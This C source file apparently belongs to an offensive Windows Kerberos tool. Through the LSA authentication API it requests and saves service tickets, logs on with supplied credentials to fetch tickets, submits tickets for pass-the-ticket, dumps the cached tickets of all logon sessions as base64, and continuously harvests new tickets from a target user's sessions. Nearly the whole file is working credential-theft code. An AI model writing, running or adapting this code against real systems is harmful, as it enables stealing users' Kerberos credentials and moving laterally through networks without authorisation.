#include "lsa.h"
#include "gate/gate.h"

#include "base64/base64.h"
#include "info/info.h"
#include "winnt.h"
#include <errhandlingapi.h>
#include <libloaderapi.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

map_entry EncryptionTypeTable[] = {
    {L"aes256", KERB_ETYPE_AES256_CTS_HMAC_SHA1_96},
    {L"aes128", KERB_ETYPE_AES128_CTS_HMAC_SHA1_96},
    {L"des", KERB_ETYPE_DES3_CBC_MD5},
    {L"rc4", KERB_ETYPE_RC4_HMAC_NT},
    {L"default", KERB_ETYPE_DEFAULT},
};
map_entry CacheOptions[] = {
    {L"cred", KERB_RETRIEVE_TICKET_AS_KERB_CRED},
    {L"cache_only", KERB_RETRIEVE_TICKET_USE_CREDHANDLE},
    {L"default", KERB_RETRIEVE_TICKET_DEFAULT},
};

HANDLE NewLsaCredentialHandle() {
  HMODULE secure32 = LoadLibraryA("secur32.dll");

  LsaConnectUntrusted_t LsaConnectUntrusted =
      (LsaConnectUntrusted_t)GetProcAddress(secure32, "LsaConnectUntrusted");
  HANDLE CredHandle;
  NTSTATUS status = LsaConnectUntrusted(&CredHandle);
  if (status != 0) {
    printf("0x%lX\n", status);
  }
  return CredHandle;
}

void InitLsaString(PLSA_STRING LsaStr, const char *str) {
  USHORT len = (USHORT)strlen(str);
  LsaStr->Buffer = (PCHAR)str;
  LsaStr->Length = len;
  LsaStr->MaximumLength = len + 1; // include null terminator
}

ULONG GetAuthPackage(HANDLE lsaHandle, char *PackageName) {
  LSA_STRING PackageNameStr;
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaLookupAuthenticationPackage_t LsaLookupAuthenticationPackage =
      (LsaLookupAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaLookupAuthenticationPackage");
  InitLsaString(&PackageNameStr, PackageName);
  ULONG PackageNum;
  NTSTATUS status =
      LsaLookupAuthenticationPackage(lsaHandle, &PackageNameStr, &PackageNum);
  if (status != 0) {
    printf("0x%lX\n", status);
  }

  return PackageNum;
}

int LookupTableType(LPCWSTR input, map_entry table[]) {
  int defaultValue;
  for (int i = 0; i < sizeof(table) / sizeof(map_entry); i++) {
    if (_wcsicmp(L"default", table[i].name) == 0) {
      defaultValue = table[i].value;
    }
    if (_wcsicmp(input, table[i].name) == 0) {
      return table[i].value;
    }
  }
  return defaultValue;
}

// Requests a TGS NOT TGT.
NTSTATUS
Kerberos_ask(PCWCHAR targetName, char *filename, LPCWSTR EncryptionType,
             LPCWSTR CacheOption, void *credHandle) {
  wprintf(L"Requesting ticket for: %s\n", targetName);
  NTSTATUS status;
  size_t ntdll = get_mod_base("ntdll.dll");
  RtlCopyMemory_t RtlCopyMemory =
      (RtlCopyMemory_t)get_function_from_exports(ntdll, "RtlCopyMemory");
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");

  PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveReq;
  PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResp = NULL;
  ULONG szResponse = 0;
  USHORT dwTarget = (USHORT)((wcslen(targetName) + 1) * sizeof(wchar_t));
  DWORD szRequest = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;

  DWORD szData;
  // USHORT dwTarget;
  OssBuf buf = {0, NULL};
  dwTarget = (USHORT)((wcslen(targetName) + 1) * sizeof(wchar_t));

  szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
  pKerbRetrieveReq = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szRequest);

  pKerbRetrieveReq->MessageType = KerbRetrieveEncodedTicketMessage;
  pKerbRetrieveReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED |
                                   LookupTableType(CacheOption, CacheOptions);
  if (LookupTableType(CacheOption, CacheOptions) ==
      KERB_RETRIEVE_TICKET_USE_CREDHANDLE) {

    pKerbRetrieveReq->CredentialsHandle = *(SecHandle *)credHandle;
  }

  pKerbRetrieveReq->EncryptionType = LookupTableType(
      EncryptionType,
      EncryptionTypeTable); // LookupEncryptionType(EncryptionType);
  pKerbRetrieveReq->TargetName.Length = dwTarget - sizeof(wchar_t);
  pKerbRetrieveReq->TargetName.MaximumLength = dwTarget;
  pKerbRetrieveReq->TargetName.Buffer =
      (PWSTR)((PBYTE)pKerbRetrieveReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
  RtlCopyMemory(pKerbRetrieveReq->TargetName.Buffer, targetName,
                pKerbRetrieveReq->TargetName.MaximumLength);

  HANDLE LsaHandle = NewLsaCredentialHandle();
  ULONG AuthPackageNum = GetAuthPackage(LsaHandle, "Kerberos");
  NTSTATUS protocolStatus;
  status = LsaCallAuthenticationPackage(
      LsaHandle, AuthPackageNum, pKerbRetrieveReq, szRequest,
      (PVOID *)&pKerbRetrieveResp, &szResponse, &protocolStatus);
  if (status != 0) {
    return status;
  }

  status = protocolStatus;
  if (status != 0) {
    return status;
  }
  buf.length = pKerbRetrieveResp->Ticket.EncodedTicketSize;
  buf.value = pKerbRetrieveResp->Ticket.EncodedTicket;
  printf("%s\n",
         base64_encode(pKerbRetrieveResp->Ticket.EncodedTicket, buf.length));
  HANDLE hfile;
  DWORD bytesWritten;
  hfile = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, NULL);
  if (hfile == INVALID_HANDLE_VALUE) {
    return GetLastError();
  }
  BOOL result = WriteFile(hfile, buf.value, buf.length, &bytesWritten, NULL);
  if (!result) {
    return GetLastError();
  }
  CloseHandle(hfile);

  return status;
}

NTSTATUS PreAuth(char *user, char *passwd, char *domain, char *spn,
                 char *filename) {
  HANDLE hLsa;
  OssBuf buf = {0, NULL};
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaLogonUser_t LsaLogonUser =
      (LsaLogonUser_t)GetProcAddress(secure32, "LsaLogonUser");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  NTSTATUS status;
  hLsa = NewLsaCredentialHandle();
  LONG authpackage;
  LSA_STRING originName;
  authpackage = GetAuthPackage(hLsa, "Kerberos");
  ULONG userLen = strlen(user);
  ULONG domainLen = strlen(domain);
  ULONG passwdLen = strlen(passwd);
  WCHAR wUser[256], wDomain[256], wPasswd[256];
  MultiByteToWideChar(CP_ACP, 0, user, -1, wUser, 256);
  MultiByteToWideChar(CP_ACP, 0, domain, -1, wDomain, 256);
  MultiByteToWideChar(CP_ACP, 0, passwd, -1, wPasswd, 256);
  ULONG authInfoSize = sizeof(KERB_INTERACTIVE_LOGON) + (wcslen(wUser) * 2) +
                       (wcslen(wDomain) * 2) + (wcslen(wPasswd) * 2);
  PKERB_INTERACTIVE_LOGON authInfo =
      (PKERB_INTERACTIVE_LOGON)calloc(1, authInfoSize);
  authInfo->MessageType = KerbInteractiveLogon;
  PBYTE ptr = (PBYTE)(authInfo + 1);

  authInfo->UserName.Buffer = (PWSTR)ptr;
  authInfo->UserName.Length = wcslen(wUser) * 2;
  authInfo->UserName.MaximumLength = authInfo->UserName.Length;
  memcpy(ptr, wUser, authInfo->UserName.Length);
  ptr += authInfo->UserName.Length;

  authInfo->LogonDomainName.Buffer = (PWSTR)ptr;
  authInfo->LogonDomainName.Length = wcslen(wDomain) * 2;
  authInfo->LogonDomainName.MaximumLength = authInfo->LogonDomainName.Length;
  memcpy(ptr, wDomain, authInfo->LogonDomainName.Length);
  ptr += authInfo->LogonDomainName.Length;

  authInfo->Password.Buffer = (PWSTR)ptr;
  authInfo->Password.Length = wcslen(wPasswd) * 2;
  authInfo->Password.MaximumLength = authInfo->Password.Length;
  memcpy(ptr, wPasswd, authInfo->Password.Length);
  originName.Buffer = "munchy";
  originName.Length = 6;
  originName.MaximumLength = 7;

  TOKEN_SOURCE sourceContext;
  memcpy(sourceContext.SourceName, "munchy  ", 8);
  AllocateLocallyUniqueId(&sourceContext.SourceIdentifier);
  HANDLE hToken;
  LUID logonId;
  LUID *pLogonId = &logonId;
  QUOTA_LIMITS quotas;
  NTSTATUS subStatus;
  PVOID profileBuffer;
  ULONG profileLen;
  status = LsaLogonUser(hLsa, &originName,
                        Interactive, // logon type
                        authpackage, authInfo, authInfoSize, NULL,
                        &sourceContext, &profileBuffer, &profileLen,
                        &logonId, // <-- this is the LUID of the new session
                        &hToken, &quotas, &subStatus);
  free(authInfo);
  if (status != 0) {
    return status;
  }

  // Now request the ticket using the new session's LUID
  ULONG spnLen = strlen(spn);
  ULONG reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (spnLen * sizeof(WCHAR));
  PKERB_RETRIEVE_TKT_REQUEST req =
      (PKERB_RETRIEVE_TKT_REQUEST)calloc(1, reqSize);

  req->MessageType = KerbRetrieveEncodedTicketMessage;
  req->LogonId = logonId; // <-- target the new session
  req->CacheOptions =
      KERB_RETRIEVE_TICKET_DONT_USE_CACHE | KERB_RETRIEVE_TICKET_AS_KERB_CRED;
  req->EncryptionType = 0;

  PWCHAR spnBuf = (PWCHAR)(req + 1);
  MultiByteToWideChar(CP_ACP, 0, spn, -1, spnBuf, spnLen + 1);
  req->TargetName.Buffer = spnBuf;
  req->TargetName.Length = spnLen * sizeof(WCHAR);
  req->TargetName.MaximumLength = req->TargetName.Length + sizeof(WCHAR);

  PKERB_RETRIEVE_TKT_RESPONSE resp = NULL;
  ULONG respLen;
  NTSTATUS protocolStatus;
  status =
      LsaCallAuthenticationPackage(hLsa, authpackage, req, reqSize,
                                   (PVOID *)&resp, &respLen, &protocolStatus);
  printf("status: 0x%lX\n", protocolStatus);
  if (status == 0 && protocolStatus == 0) {

    buf.length = resp->Ticket.EncodedTicketSize;
    buf.value = resp->Ticket.EncodedTicket;
    //*ticketLen = resp->Ticket.EncodedTicketSize;
    printf("EncodedTicketSize: %lu\n",
           resp ? resp->Ticket.EncodedTicketSize : 0);
    HANDLE hfile;
    DWORD bytesWritten;
    hfile = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE) {
      return GetLastError();
    }
    BOOL result = WriteFile(hfile, buf.value, buf.length, &bytesWritten, NULL);
    if (!result) {
      return GetLastError();
    }
    CloseHandle(hfile);

    //*ticketOut = (PBYTE)malloc(*ticketLen);
    // memcpy(*ticketOut, resp->Ticket.EncodedTicket, *ticketLen);
  }

  return status;
}

NTSTATUS Ptt(PVOID data, DWORD dataSize) {
  NTSTATUS status, protocolStatus;
  DWORD submitSize, responseSize;
  PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
  PVOID dumPtr;

  // get important functions.
  size_t ntdll = get_mod_base("ntdll.dll");
  RtlCopyMemory_t RtlCopyMemory =
      (RtlCopyMemory_t)get_function_from_exports(ntdll, "RtlCopyMemory");
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  if (!LsaCallAuthenticationPackage) {
    printf("GetProcAddress failed: 0x%lx\n", GetLastError());
    return -1;
  }

  // build submit
  submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
  pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize);
  pKerbSubmit->MessageType = KerbSubmitTicketMessage;
  pKerbSubmit->KerbCredSize = dataSize;
  pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
  pKerbSubmit->LogonId.HighPart = 0;
  pKerbSubmit->LogonId.LowPart = 0;
  RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, data,
                dataSize);
  HANDLE hlsa = NewLsaCredentialHandle();
  LONG kerb = GetAuthPackage(hlsa, "Kerberos");
  status = LsaCallAuthenticationPackage(hlsa, kerb, pKerbSubmit, submitSize,
                                        &dumPtr, &responseSize,
                                        &protocolStatus); // submit ticket!
  printf("status: 0x%lX, protocolStatus: 0x%lX\n", status, protocolStatus);
  if (status != 0) {
    LocalFree(pKerbSubmit);
    return status;
  }
  status = protocolStatus;
  LocalFree(pKerbSubmit);

  return status;
}

NTSTATUS ListTickets() {
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  // get logon sessions
  LsaEnumerateLogonSessions_t LsaEnumerateLogonSessions =
      (LsaEnumerateLogonSessions_t)GetProcAddress(secure32,
                                                  "LsaEnumerateLogonSessions");
  LsaGetLogonSessionData_t LsaGetLogonSessionData =
      (LsaGetLogonSessionData_t)GetProcAddress(secure32,
                                               "LsaGetLogonSessionData");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  LsaFreeReturnBuffer_t LsaFreeReturnBuffer =
      (LsaFreeReturnBuffer_t)GetProcAddress(secure32, "LsaFreeReturnBuffer");

  PLUID Pluids;
  ULONG count;
  NTSTATUS status, protocolStatus;
  HANDLE lsaHandle = NewLsaCredentialHandle();
  ULONG authpkg = GetAuthPackage(lsaHandle, "Kerberos");

  status = LsaEnumerateLogonSessions(&count, &Pluids);
  if (status != 0) {
    printf("failed to enumerate logged on sessions: 0x%lx\n", status);
    return status;
  }
  printf("number of logged on sessions: %lu\n", count);

  for (int i = 0; i < count; i++) {

    LUID luid = Pluids[i];
    PSECURITY_LOGON_SESSION_DATA sessionData;
    status = LsaGetLogonSessionData(&luid, &sessionData);
    if (status != 0x0) {
      printf("failed to get session data: 0x%lx\n", status);
      return status;
    }
    KERB_QUERY_TKT_CACHE_REQUEST req;
    ULONG respSize = 0;
    PVOID pResponse = NULL;
    memset(&req, 0, sizeof(req));
    req.MessageType = KerbQueryTicketCacheExMessage;
    req.LogonId = luid;
    status =
        LsaCallAuthenticationPackage(lsaHandle, authpkg, &req, sizeof(req),
                                     &pResponse, &respSize, &protocolStatus);
    if (status != 0x0) {
      printf("status is bad in LsaCallAuthenticationPackage: 0x%lu\n", status);
      return status;
    }
    if (protocolStatus != 0x0) {
      if (protocolStatus ==
          STATUS_NO_SUCH_LOGON_SESSION) { // ignore/suppress non critical
                                          // errors.
        continue;
      }
      printf("protocolStatus is not ok: 0x%lu\n", protocolStatus);
      return protocolStatus;
    }
    KERB_QUERY_TKT_CACHE_RESPONSE *pResp =
        (KERB_QUERY_TKT_CACHE_RESPONSE *)pResponse;
    ULONG countTick = pResp->CountOfTickets;
    for (int i2 = 0; i2 < countTick; i2++) {
      KERB_TICKET_CACHE_INFO_EX ticketResp = pResp->Tickets[i2];
      // KERB_RETRIEVE_TKT_RESPONSE retrivedResp;
      ULONG respSize = 0;

      SIZE_T nameLen = ticketResp.ServerName.Length;
      SIZE_T reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + nameLen;
      KERB_RETRIEVE_TKT_REQUEST *retriveTick =
          (KERB_RETRIEVE_TKT_REQUEST *)LocalAlloc(LPTR, reqSize);
      // then set fields after
      retriveTick->MessageType = KerbRetrieveEncodedTicketMessage;
      retriveTick->LogonId = luid;
      retriveTick->TicketFlags = ticketResp.TicketFlags;
      retriveTick->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
      retriveTick->EncryptionType = ticketResp.EncryptionType;

      // Point Buffer to the memory immediately after the struct
      retriveTick->TargetName.Length = (USHORT)nameLen;
      retriveTick->TargetName.MaximumLength = (USHORT)nameLen;
      retriveTick->TargetName.Buffer = (PWSTR)(retriveTick + 1);
      memcpy(retriveTick->TargetName.Buffer, ticketResp.ServerName.Buffer,
             nameLen);

      PVOID respVoid = NULL;
      status = LsaCallAuthenticationPackage(lsaHandle, authpkg, retriveTick,
                                            (ULONG)reqSize, &respVoid,
                                            &respSize, &protocolStatus);
      if (status != 0x0) {
        printf("bad status: 0x%lx\n", status);
      }
      if (protocolStatus != 0x0) {
        if (protocolStatus == 0xC0000135 || protocolStatus == 0x8009030E) {
          continue;
        } // other stuff

        printf("protocolStatus: 0x%lx\n", protocolStatus);
      }

      KERB_RETRIEVE_TKT_RESPONSE *retrivedResp =
          (KERB_RETRIEVE_TKT_RESPONSE *)respVoid;
      if (retrivedResp == NULL) {
        continue;
      }
      printf("---------\n%s\n---------\n",
             base64_encode(retrivedResp->Ticket.EncodedTicket,
                           retrivedResp->Ticket.EncodedTicketSize));
      if (respVoid) {
        LsaFreeReturnBuffer(respVoid);
        respVoid = NULL;
      }
    }
    if (pResponse) {
      LsaFreeReturnBuffer(pResponse);
      pResponse = NULL;
    }
  }
  return status;
}

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int sig) {
  keep_running = 0; // Set flag to exit loop
}

NTSTATUS KerberosListen(WCHAR *targetUser) {
  NTSTATUS status;

  HANDLE lsaHandle = NewLsaCredentialHandle();
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  size_t ntdll = get_mod_base("ntdll.dll");
  KERB_RETRIEVE_TKT_RESPONSE *tickets = NULL;
  RtlEqualUnicodeString_t RtlEqualUnicodeString =
      (RtlEqualUnicodeString_t)get_function_from_exports(
          ntdll, "RtlEqualUnicodeString");

  // get logon sessions
  LsaEnumerateLogonSessions_t LsaEnumerateLogonSessions =
      (LsaEnumerateLogonSessions_t)GetProcAddress(secure32,
                                                  "LsaEnumerateLogonSessions");
  LsaGetLogonSessionData_t LsaGetLogonSessionData =
      (LsaGetLogonSessionData_t)GetProcAddress(secure32,
                                               "LsaGetLogonSessionData");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  LsaFreeReturnBuffer_t LsaFreeReturnBuffer =
      (LsaFreeReturnBuffer_t)GetProcAddress(secure32, "LsaFreeReturnBuffer");
  UNICODE_STRING tempStr;
  int ticketCount = 0;
  RtlInitUnicodeString(&tempStr, targetUser);
  signal(SIGINT, handle_sigint);
  while (keep_running) {
    PLUID Pluids = {0};
    ULONG count = 0;
    NTSTATUS protocolStatus = 0;

    ULONG authpkg = GetAuthPackage(lsaHandle, "Kerberos");

    status = LsaEnumerateLogonSessions(&count, &Pluids);
    if (status != 0) {
      printf("failed to enumerate logged on sessions: 0x%lx\n", status);
      return status;
    }
    for (int i = 0; i < count; i++) {

      LUID luid = Pluids[i];
      PSECURITY_LOGON_SESSION_DATA sessionData;
      status = LsaGetLogonSessionData(&luid, &sessionData);
      if (status != 0x0) {
        printf("failed to get session data: 0x%lx\n", status);
        return status;
      }

      if (RtlEqualUnicodeString(&sessionData->UserName, &tempStr, TRUE)) {
        // query tickets
        //
        KERB_QUERY_TKT_CACHE_REQUEST req;
        ULONG respSize = 0;
        PVOID pResponse = NULL;
        memset(&req, 0, sizeof(req));
        req.MessageType = KerbQueryTicketCacheExMessage;
        req.LogonId = luid;
        status = LsaCallAuthenticationPackage(lsaHandle, authpkg, &req,
                                              sizeof(req), &pResponse,
                                              &respSize, &protocolStatus);
        if (status != 0x0) {
          printf("status is bad in LsaCallAuthenticationPackage: 0x%lu\n",
                 status);
          return status;
        }
        if (protocolStatus != 0x0) {
          if (protocolStatus ==
              STATUS_NO_SUCH_LOGON_SESSION) { // ignore/suppress non critical
                                              // errors.
            continue;
          }
          printf("protocolStatus is not ok: 0x%lu\n", protocolStatus);
          return protocolStatus;
        }
        KERB_QUERY_TKT_CACHE_RESPONSE *pResp =
            (KERB_QUERY_TKT_CACHE_RESPONSE *)pResponse;
        ULONG countTick = pResp->CountOfTickets;
        for (int i2 = 0; i2 < countTick; i2++) {
          KERB_TICKET_CACHE_INFO_EX ticketResp = pResp->Tickets[i2];
          // KERB_RETRIEVE_TKT_RESPONSE retrivedResp;
          ULONG respSize = 0;
          SIZE_T nameLen = ticketResp.ServerName.Length;
          SIZE_T reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + nameLen;
          KERB_RETRIEVE_TKT_REQUEST *retriveTick =
              (KERB_RETRIEVE_TKT_REQUEST *)LocalAlloc(LPTR, reqSize);
          // then set fields after
          retriveTick->MessageType = KerbRetrieveEncodedTicketMessage;
          retriveTick->LogonId = luid;
          retriveTick->TicketFlags = ticketResp.TicketFlags;
          retriveTick->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
          retriveTick->EncryptionType = ticketResp.EncryptionType;

          // Point Buffer to the memory immediately after the struct
          retriveTick->TargetName.Length = (USHORT)nameLen;
          retriveTick->TargetName.MaximumLength = (USHORT)nameLen;
          retriveTick->TargetName.Buffer = (PWSTR)(retriveTick + 1);
          memcpy(retriveTick->TargetName.Buffer, ticketResp.ServerName.Buffer,
                 nameLen);

          PVOID respVoid = NULL;
          status = LsaCallAuthenticationPackage(lsaHandle, authpkg, retriveTick,
                                                (ULONG)reqSize, &respVoid,
                                                &respSize, &protocolStatus);
          if (status != 0x0) {
            printf("bad status: 0x%lx\n", status);
          }
          if (protocolStatus != 0x0) {
            if (protocolStatus == 0xC0000135 || protocolStatus == 0x8009030E) {
              continue;
            } // other stuff

            printf("protocolStatus: 0x%lx\n", protocolStatus);
            return protocolStatus;
          }

          KERB_RETRIEVE_TKT_RESPONSE *retrivedResp =
              (KERB_RETRIEVE_TKT_RESPONSE *)respVoid;
          if (retrivedResp == NULL) {
            continue;
          }
          // int ti = 0;
          //  ... inside the ticket loop:

          BOOL found = FALSE;
          for (int ti = 0; ti < ticketCount; ti++) {
            if (memcmp(tickets[ti].Ticket.EncodedTicket,
                       retrivedResp->Ticket.EncodedTicket,
                       retrivedResp->Ticket.EncodedTicketSize) == 0) {
              found = TRUE;
              break;
            }
          }
          if (!found) {
            tickets = realloc(tickets, (ticketCount + 1) *
                                           sizeof(KERB_RETRIEVE_TKT_RESPONSE));

            // Deep copy the ticket struct
            tickets[ticketCount].Ticket = retrivedResp->Ticket;

            // Deep copy the encoded ticket bytes
            ULONG ticketSize = retrivedResp->Ticket.EncodedTicketSize;
            tickets[ticketCount].Ticket.EncodedTicket = malloc(ticketSize);
            memcpy(tickets[ticketCount].Ticket.EncodedTicket,
                   retrivedResp->Ticket.EncodedTicket, ticketSize);

            ticketCount++;
            printf("---------\n%s\n---------\n",
                   base64_encode(
                       tickets[ticketCount - 1].Ticket.EncodedTicket,
                       tickets[ticketCount - 1].Ticket.EncodedTicketSize));
          }

          if (respVoid) {
            LsaFreeReturnBuffer(respVoid);
            respVoid = NULL;
          }
        }
        if (pResponse) {
          LsaFreeReturnBuffer(pResponse);
          pResponse = NULL;
        }
      }
    }
    Sleep(1000);
  }
  for (int i = 0; i < ticketCount; i++) {
    free(tickets[i].Ticket.EncodedTicket);
  }
  free(tickets);

  return status;
}
